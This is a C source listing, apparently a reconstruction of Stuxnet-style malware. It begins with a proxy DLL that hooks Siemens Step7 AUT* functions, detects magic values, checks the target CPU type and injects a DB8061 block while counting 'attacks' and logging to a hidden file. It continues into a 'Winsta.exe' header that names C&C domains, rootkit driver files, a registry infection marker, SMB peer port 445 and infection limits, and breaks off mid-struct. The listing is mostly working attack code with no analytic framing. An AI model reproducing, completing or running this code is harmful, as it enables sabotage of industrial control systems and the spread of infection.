    hFile = CreateFile(szLogPath, GENERIC_WRITE, FILE_SHARE_READ, NULL,
                       OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    GetLocalTime(&st);
    wsprintf(szBuffer, _T("[%04d-%02d-%02d %02d:%02d:%02d] %s\r\n"),
             st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, szEvent);

    SetFilePointer(hFile, 0, NULL, FILE_END);
    WriteFile(hFile, szBuffer, wcslen(szBuffer) * sizeof(TCHAR), &dwWritten, NULL);
    CloseHandle(hFile);
}

static VOID LogError(LPCWSTR szError) {
    TCHAR szBuffer[1024];
    wsprintf(szBuffer, _T("ERROR: %s"), szError);
    LogEvent(szBuffer);
}

DWORD WINAPI AUTDoVerb(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    DWORD dwResult;
    TCHAR szDbgMsg[256];

    if (!g_OriginalFunctions.pfnAUTDoVerb) {
        return 0xFFFFFFFF;
    }

    EnterCriticalSection(&g_csLock);

    if (a2 == S7AAAPIX_MAGIC_DB8061 ||
        a2 == S7AAAPIX_MAGIC_DB8061_2 ||
        a2 == S7AAAPIX_MAGIC_DB8061_3) {

        wsprintf(szDbgMsg, _T("[S7AAAPIX] AUTDoVerb: Magic value detected (0x%08X)\n"), a2);
        OutputDebugString(szDbgMsg);
        LogEvent(L"AUTDoVerb: Magic value detected");

        if (IsTargetSystem()) {
            wsprintf(szDbgMsg, _T("[S7AAAPIX] AUTDoVerb: Target system verified (CPU: 0x%08X)\n"), g_dwCPUType);
            OutputDebugString(szDbgMsg);

            ParseSymbolTags();

            if (CreateDB8061()) {
                wsprintf(szDbgMsg, _T("[S7AAAPIX] AUTDoVerb: DB8061 created successfully\n"));
                OutputDebugString(szDbgMsg);
                LogEvent(L"AUTDoVerb: DB8061 created successfully");
                g_dwAttackCount++;
            } else {
                wsprintf(szDbgMsg, _T("[S7AAAPIX] AUTDoVerb: Failed to create DB8061\n"));
                OutputDebugString(szDbgMsg);
                LogError(L"AUTDoVerb: Failed to create DB8061");
            }
        } else {
            wsprintf(szDbgMsg, _T("[S7AAAPIX] AUTDoVerb: Not a target system (CPU: 0x%08X)\n"), g_dwCPUType);
            OutputDebugString(szDbgMsg);
        }

        LeaveCriticalSection(&g_csLock);
        return 0;
    }

    dwResult = g_OriginalFunctions.pfnAUTDoVerb(a1, a2, a3, a4);
    LeaveCriticalSection(&g_csLock);

    return dwResult;
}

DWORD WINAPI AUTOpenObjectSet(DWORD a1, DWORD a2, DWORD a3) {
    if (!g_OriginalFunctions.pfnAUTOpenObjectSet) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTOpenObjectSet(a1, a2, a3);
}

DWORD WINAPI AUTCloseObjectSet(DWORD a1) {
    if (!g_OriginalFunctions.pfnAUTCloseObjectSet) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTCloseObjectSet(a1);
}

DWORD WINAPI AUTGetObject(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObject) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObject(a1, a2, a3, a4);
}

DWORD WINAPI AUTPutObject(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTPutObject) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTPutObject(a1, a2, a3, a4);
}

DWORD WINAPI AUTDeleteObject(DWORD a1, DWORD a2, DWORD a3) {
    if (!g_OriginalFunctions.pfnAUTDeleteObject) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTDeleteObject(a1, a2, a3);
}

DWORD WINAPI AUTFindFirst(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTFindFirst) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTFindFirst(a1, a2, a3, a4);
}

DWORD WINAPI AUTFindNext(DWORD a1, DWORD a2, DWORD a3) {
    if (!g_OriginalFunctions.pfnAUTFindNext) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTFindNext(a1, a2, a3);
}

DWORD WINAPI AUTGetInfo(DWORD a1, DWORD a2, DWORD a3) {
    if (!g_OriginalFunctions.pfnAUTGetInfo) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetInfo(a1, a2, a3);
}

DWORD WINAPI AUTSetInfo(DWORD a1, DWORD a2, DWORD a3) {
    if (!g_OriginalFunctions.pfnAUTSetInfo) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetInfo(a1, a2, a3);
}

DWORD WINAPI AUTGetData(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetData) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetData(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetData(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetData) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetData(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetVersion(DWORD a1, DWORD a2) {
    if (!g_OriginalFunctions.pfnAUTGetVersion) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetVersion(a1, a2);
}

DWORD WINAPI AUTInitialize(DWORD a1, DWORD a2) {
    if (!g_OriginalFunctions.pfnAUTInitialize) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTInitialize(a1, a2);
}

DWORD WINAPI AUTDeinitialize(DWORD a1) {
    if (!g_OriginalFunctions.pfnAUTDeinitialize) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTDeinitialize(a1);
}

DWORD WINAPI AUTGetLastError(DWORD a1) {
    if (!g_OriginalFunctions.pfnAUTGetLastError) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetLastError(a1);
}

DWORD WINAPI AUTSetLastError(DWORD a1, DWORD a2) {
    if (!g_OriginalFunctions.pfnAUTSetLastError) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetLastError(a1, a2);
}

DWORD WINAPI AUTGetObjectSetInfo(DWORD a1, DWORD a2, DWORD a3) {
    if (!g_OriginalFunctions.pfnAUTGetObjectSetInfo) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectSetInfo(a1, a2, a3);
}

DWORD WINAPI AUTSetObjectSetInfo(DWORD a1, DWORD a2, DWORD a3) {
    if (!g_OriginalFunctions.pfnAUTSetObjectSetInfo) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectSetInfo(a1, a2, a3);
}

DWORD WINAPI AUTGetObjectInfo(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectInfo) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectInfo(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectInfo(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectInfo) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectInfo(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectData(DWORD a1, DWORD a2, DWORD a3, DWORD a4, DWORD a5) {
    if (!g_OriginalFunctions.pfnAUTGetObjectData) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectData(a1, a2, a3, a4, a5);
}

DWORD WINAPI AUTSetObjectData(DWORD a1, DWORD a2, DWORD a3, DWORD a4, DWORD a5) {
    if (!g_OriginalFunctions.pfnAUTSetObjectData) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectData(a1, a2, a3, a4, a5);
}

DWORD WINAPI AUTDeleteObjectData(DWORD a1, DWORD a2, DWORD a3) {
    if (!g_OriginalFunctions.pfnAUTDeleteObjectData) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTDeleteObjectData(a1, a2, a3);
}

DWORD WINAPI AUTGetObjectList(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectList) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectList(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectSetList(DWORD a1, DWORD a2, DWORD a3) {
    if (!g_OriginalFunctions.pfnAUTGetObjectSetList) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectSetList(a1, a2, a3);
}

DWORD WINAPI AUTGetObjectType(DWORD a1, DWORD a2, DWORD a3) {
    if (!g_OriginalFunctions.pfnAUTGetObjectType) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectType(a1, a2, a3);
}

DWORD WINAPI AUTSetObjectType(DWORD a1, DWORD a2, DWORD a3) {
    if (!g_OriginalFunctions.pfnAUTSetObjectType) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectType(a1, a2, a3);
}

DWORD WINAPI AUTGetObjectName(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectName) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectName(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectName(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectName) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectName(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectPath(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectPath) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectPath(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectPath(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectPath) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectPath(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectParent(DWORD a1, DWORD a2, DWORD a3) {
    if (!g_OriginalFunctions.pfnAUTGetObjectParent) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectParent(a1, a2, a3);
}

DWORD WINAPI AUTSetObjectParent(DWORD a1, DWORD a2, DWORD a3) {
    if (!g_OriginalFunctions.pfnAUTSetObjectParent) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectParent(a1, a2, a3);
}

DWORD WINAPI AUTGetObjectChildren(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectChildren) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectChildren(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectAttributes(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectAttributes) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectAttributes(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectAttributes(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectAttributes) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectAttributes(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectPermissions(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectPermissions) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectPermissions(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectPermissions(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectPermissions) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectPermissions(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectOwner(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectOwner) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectOwner(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectOwner(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectOwner) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectOwner(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectGroup(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectGroup) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectGroup(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectGroup(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectGroup) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectGroup(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectACL(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectACL) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectACL(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectACL(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectACL) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectACL(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectSID(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectSID) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectSID(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectSID(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectSID) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectSID(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectGUID(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectGUID) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectGUID(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectGUID(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectGUID) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectGUID(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectCreationTime(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectCreationTime) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectCreationTime(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectModificationTime(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectModificationTime) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectModificationTime(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectAccessTime(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectAccessTime) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectAccessTime(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectSize(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectSize) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectSize(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectChecksum(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectChecksum) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectChecksum(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectChecksum(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectChecksum) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectChecksum(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectVersion(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectVersion) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectVersion(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectVersion(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectVersion) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectVersion(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectState(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectState) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectState(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectState(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectState) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectState(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectStatus(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectStatus) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectStatus(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectStatus(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectStatus) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectStatus(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectError(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectError) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectError(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectError(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectError) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectError(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectWarning(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectWarning) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectWarning(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectWarning(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectWarning) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectWarning(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectInfoEx(DWORD a1, DWORD a2, DWORD a3, DWORD a4, DWORD a5) {
    if (!g_OriginalFunctions.pfnAUTGetObjectInfoEx) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectInfoEx(a1, a2, a3, a4, a5);
}

DWORD WINAPI AUTSetObjectInfoEx(DWORD a1, DWORD a2, DWORD a3, DWORD a4, DWORD a5) {
    if (!g_OriginalFunctions.pfnAUTSetObjectInfoEx) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectInfoEx(a1, a2, a3, a4, a5);
}

DWORD WINAPI AUTGetObjectDataEx(DWORD a1, DWORD a2, DWORD a3, DWORD a4, DWORD a5, DWORD a6) {
    if (!g_OriginalFunctions.pfnAUTGetObjectDataEx) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectDataEx(a1, a2, a3, a4, a5, a6);
}

DWORD WINAPI AUTSetObjectDataEx(DWORD a1, DWORD a2, DWORD a3, DWORD a4, DWORD a5, DWORD a6) {
    if (!g_OriginalFunctions.pfnAUTSetObjectDataEx) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectDataEx(a1, a2, a3, a4, a5, a6);
}

DWORD WINAPI AUTDeleteObjectEx(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTDeleteObjectEx) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTDeleteObjectEx(a1, a2, a3, a4);
}

DWORD WINAPI AUTCopyObject(DWORD a1, DWORD a2, DWORD a3, DWORD a4, DWORD a5) {
    if (!g_OriginalFunctions.pfnAUTCopyObject) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTCopyObject(a1, a2, a3, a4, a5);
}

DWORD WINAPI AUTMoveObject(DWORD a1, DWORD a2, DWORD a3, DWORD a4, DWORD a5) {
    if (!g_OriginalFunctions.pfnAUTMoveObject) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTMoveObject(a1, a2, a3, a4, a5);
}

DWORD WINAPI AUTRenameObject(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTRenameObject) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTRenameObject(a1, a2, a3, a4);
}

DWORD WINAPI AUTLockObject(DWORD a1, DWORD a2, DWORD a3) {
    if (!g_OriginalFunctions.pfnAUTLockObject) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTLockObject(a1, a2, a3);
}

DWORD WINAPI AUTUnlockObject(DWORD a1, DWORD a2, DWORD a3) {
    if (!g_OriginalFunctions.pfnAUTUnlockObject) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTUnlockObject(a1, a2, a3);
}

DWORD WINAPI AUTIsObjectLocked(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTIsObjectLocked) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTIsObjectLocked(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectLockOwner(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectLockOwner) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectLockOwner(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectLockTime(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectLockTime) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectLockTime(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectLockDuration(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectLockDuration) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectLockDuration(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectLockDuration(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectLockDuration) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectLockDuration(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectLockType(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectLockType) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectLockType(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectLockType(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectLockType) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectLockType(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectLockCount(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectLockCount) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectLockCount(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectLockList(DWORD a1, DWORD a2, DWORD a3, DWORD a4, DWORD a5) {
    if (!g_OriginalFunctions.pfnAUTGetObjectLockList) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectLockList(a1, a2, a3, a4, a5);
}
END

Winsta.exe:
#define _WIN32_WINNT 0x0501
#define WINVER 0x0501

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tchar.h>
#include <winspool.h>
#include <wbemidl.h>
#include <comdef.h>
#include <shlwapi.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <aclapi.h>
#include <sddl.h>
#include <ntsecapi.h>
#include <winternl.h>

#pragma comment(lib, "winspool.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "ntdll.lib")

#define WINSTA_MAGIC                    0x57534E54
#define WINSTA_VERSION                  0x00010400
#define WINSTA_MAX_PATH                 260
#define WINSTA_BUFFER_SIZE              4096
#define WINSTA_MAX_RETRIES              3
#define WINSTA_TIMEOUT_MS               5000

#define STUXNET_DRIVER1                 L"mrxcls.sys"
#define STUXNET_DRIVER2                 L"mrxnet.sys"
#define STUXNET_PNF1                    L"oem7A.PNF"
#define STUXNET_PNF2                    L"oem6C.PNF"
#define STUXNET_PNF3                    L"mdmcpq3.PNF"
#define STUXNET_PNF4                    L"mdmeric3.PNF"
#define STUXNET_REG_KEY                 L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NTVDM TRACE"
#define STUXNET_REG_VALUE               L"19790509"
#define STUXNET_CC_SERVER1              L"www.mypremierfutbol.com"
#define STUXNET_CC_SERVER2              L"www.todaysfutbol.com"
#define STUXNET_CC_PORT                 80
#define STUXNET_PEER_PORT               445
#define STUXNET_MAX_INFECT              0xFFFFFFFE
#define STUXNET_EXPIRY_YEAR             2012

#define STATUS_SUCCESS                  ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL             ((NTSTATUS)0xC0000001L)
#define STATUS_ACCESS_DENIED            ((NTSTATUS)0xC0000022L)
#define STATUS_INVALID_PARAMETER        ((NTSTATUS)0xC000000DL)
#define STATUS_OBJECT_NAME_NOT_FOUND    ((NTSTATUS)0xC0000034L)
#define STATUS_INSUFFICIENT_RESOURCES   ((NTSTATUS)0xC000009AL)
#define STATUS_BUFFER_TOO_SMALL         ((NTSTATUS)0xC0000023L)

#define NtCurrentProcess()              ((HANDLE)(LONG_PTR)-1)

#define InitializeObjectAttributes(p, n, a, r, s) { (p)->Length = sizeof(OBJECT_ATTRIBUTES); (p)->RootDirectory = r; (p)->Attributes = a; (p)->ObjectName = n; (p)->SecurityDescriptor = s; (p)->SecurityQualityOfService = NULL; }

typedef struct _WINSTA_CTX {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwFlags;
    DWORD dwState;
    DWORD dwPid;
    DWORD dwTid;
    DWORD dwTickStart;
    DWORD dwTickLast;
    DWORD dwRetryCount;
    DWORD dwMaxRetries;
    DWORD dwTimeout;
    HANDLE hMutex;
    HANDLE hThread;
    HANDLE hStopEvent;
    CRITICAL_SECTION csLock;
    WCHAR szModulePath[WINSTA_MAX_PATH];
    WCHAR szSystemPath[WINSTA_MAX_PATH];
    WCHAR szWindowsPath[WINSTA_MAX_PATH];
    WCHAR szTempPath[WINSTA_MAX_PATH];
    WCHAR szDriverPath[WINSTA_MAX_PATH];
    WCHAR szInfPath[WINSTA_MAX_PATH];
    WCHAR szMofPath[WINSTA_MAX_PATH];
    WCHAR szWbemPath[WINSTA_MAX_PATH];
    BYTE bReserved[256];
} WINSTA_CTX, * PWINSTA_CTX;

typedef struct _WINSTA_PEER_ENTRY {
    DWORD dwIP;
    WORD wPort;
    WORD wFlags;
    DWORD dwLastSeen;
    DWORD dwLatency;
    DWORD dwVersion;
    BYTE bReserved[16];
} WINSTA_PEER_ENTRY, * PWINSTA_PEER_ENTRY;

typedef struct _WINSTA_CONFIG {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwSize;
    DWORD dwCRC32;
    DWORD dwFlags;
    DWORD dwMaxInfections;
    DWORD dwExpiryDate;
    DWORD dwCCServerCount;
    WCHAR szCCServers[8][64];
    WORD wCCPorts[8];
    DWORD dwPeerPort;
